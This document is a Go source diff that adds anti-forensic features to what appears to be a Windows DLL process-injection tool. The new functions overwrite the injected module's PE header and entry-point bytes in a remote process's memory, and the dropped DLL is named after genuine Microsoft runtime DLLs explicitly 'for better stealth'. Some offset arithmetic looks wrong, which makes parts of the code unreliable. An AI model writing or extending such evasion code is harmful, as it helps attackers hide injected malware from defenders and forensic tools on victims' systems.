@@ -704,10 +704,110 @@ func LegitimateProcessInjection(hProcess windows.Handle, dllBytes []byte) error 
 	return nil
 }
 
-// Helper function to create temp DLL file
+// ErasePEHeaderSafely performs safer PE header erasure for LoadLibrary-based injections
+func ErasePEHeaderSafely(processHandle windows.Handle, baseAddress uintptr) error {
+	Printf("Starting safe PE header erasure for LoadLibrary-based injection\n")
+
+	// Only erase non-critical parts of the PE header
+	// Preserve export table, import table, and other critical structures
+
+	// Phase 1: Erase DOS stub only (safest)
+	if err := eraseDOSStub(processHandle, baseAddress); err != nil {
+		return fmt.Errorf("failed to erase DOS stub: %v", err)
+	}
+
+	// Phase 2: Modify PE signature to a less obvious value (but not completely erase)
+	peSignatureAddr := baseAddress + 0x3C
+	var peOffset uint32
+	var bytesRead uintptr
+
+	err := windows.ReadProcessMemory(processHandle, peSignatureAddr,
+		(*byte)(unsafe.Pointer(&peOffset)), 4, &bytesRead)
+	if err != nil {
+		return fmt.Errorf("failed to read PE offset: %v", err)
+	}
+
+	// Modify PE signature to look like a different file type
+	modifiedSignature := []byte{0x4D, 0x5A, 0x90, 0x00} // Modified but still functional
+	var bytesWritten uintptr
+	err = WriteProcessMemory(processHandle, baseAddress+uintptr(peOffset),
+		unsafe.Pointer(&modifiedSignature[0]), 4, &bytesWritten)
+	if err != nil {
+		Printf("Warning: Failed to modify PE signature: %v\n", err)
+	}
+
+	Printf("Safe PE header erasure completed\n")
+	return nil
+}
+
+// EraseEntryPointSafely performs safer entry point erasure for LoadLibrary-based injections
+func EraseEntryPointSafely(processHandle windows.Handle, baseAddress uintptr) error {
+	Printf("Starting safe entry point erasure for LoadLibrary-based injection\n")
+
+	// Read PE header to find entry point
+	var dosHeader [64]byte
+	var bytesRead uintptr
+
+	err := windows.ReadProcessMemory(processHandle, baseAddress, &dosHeader[0], 64, &bytesRead)
+	if err != nil {
+		return fmt.Errorf("failed to read DOS header: %v", err)
+	}
+
+	peOffset := *(*uint32)(unsafe.Pointer(&dosHeader[0x3C]))
+
+	// Read NT headers to get entry point
+	var ntHeaders [248]byte // Size of IMAGE_NT_HEADERS64
+	err = windows.ReadProcessMemory(processHandle, baseAddress+uintptr(peOffset),
+		&ntHeaders[0], 248, &bytesRead)
+	if err != nil {
+		return fmt.Errorf("failed to read NT headers: %v", err)
+	}
+
+	// Get entry point RVA (offset 40 in optional header)
+	entryPointRVA := *(*uint32)(unsafe.Pointer(&ntHeaders[24+16+40]))
+
+	if entryPointRVA == 0 {
+		Printf("No entry point found, skipping erasure\n")
+		return nil
+	}
+
+	entryPointAddr := baseAddress + uintptr(entryPointRVA)
+
+	// Instead of completely erasing, just modify the first few bytes
+	// This preserves most functionality while still providing some obfuscation
+	modifiedBytes := []byte{0x90, 0x90, 0x90, 0x90} // NOP sled (safer than complete erasure)
+
+	var bytesWritten uintptr
+	err = WriteProcessMemory(processHandle, entryPointAddr,
+		unsafe.Pointer(&modifiedBytes[0]), 4, &bytesWritten)
+	if err != nil {
+		return fmt.Errorf("failed to modify entry point: %v", err)
+	}
+
+	Printf("Safe entry point modification completed\n")
+	return nil
+}
+
+// Helper function to create temp DLL file using real DLL names
 func createTempDllFile(dllBytes []byte) (string, error) {
 	tempDir := os.TempDir()
-	fileName := fmt.Sprintf("temp_dll_%d.dll", time.Now().UnixNano())
+
+	// Use real system DLL names for better stealth
+	realDllNames := []string{
+		"msvcr120.dll",
+		"msvcp120.dll",
+		"vcruntime140.dll",
+		"msvcp140.dll",
+		"ucrtbase.dll",
+		"concrt140.dll",
+		"vccorlib140.dll",
+		"api-ms-win-core-heap-l1-1-0.dll",
+		"api-ms-win-core-synch-l1-2-0.dll",
+		"api-ms-win-core-memory-l1-1-1.dll",
+	}
+
+	// Select a real DLL name based on current time
+	fileName := realDllNames[time.Now().UnixNano()%int64(len(realDllNames))]
 	tempFile := filepath.Join(tempDir, fileName)
 
 	err := os.WriteFile(tempFile, dllBytes, 0644)
